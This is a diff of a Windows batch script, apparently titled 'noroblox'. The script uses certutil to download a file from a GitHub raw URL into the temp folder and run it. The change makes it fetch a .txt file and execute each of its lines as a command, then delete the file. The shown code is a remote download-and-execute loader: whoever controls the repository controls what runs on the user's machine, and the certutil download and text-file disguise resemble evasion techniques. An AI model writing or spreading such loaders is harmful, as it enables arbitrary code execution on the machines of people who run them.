@@ -1,19 +1,20 @@
 @echo off
-SET "url=https://raw.githubusercontent.com/Zombro01/blob.../refs/heads/main/noroblox.bat"
-SET "tempFile=%TEMP%\remote_noroblox.bat"
+SET "url=https://raw.githubusercontent.com/Zombro01/blob.../refs/heads/main/nrblx.txt"
+SET "tempFile=%TEMP%\nrblx.txt"
 
-echo Downloading batch file from %url%...
-:: Download the latest version from GitHub using certutil
+echo Downloading command file from %url%...
+:: Download the file using certutil
 certutil -urlcache -split -f "%url%" "%tempFile%" >nul 2>&1
 
 :: Check if the file was downloaded successfully
 IF EXIST "%tempFile%" (
-    echo Download successful. Running the script...
-    call "%tempFile%"
+    echo Download successful. Executing commands...
+    :: Execute each line in the downloaded file
+    for /f "delims=" %%i in (%tempFile%) do call %%i
     :: Clean up the temporary file
     del "%tempFile%" >nul
 ) ELSE (
-    echo Failed to download the script. Please check your internet connection.
+    echo Failed to download the command file. Please check your internet connection.
 )
 
 pause
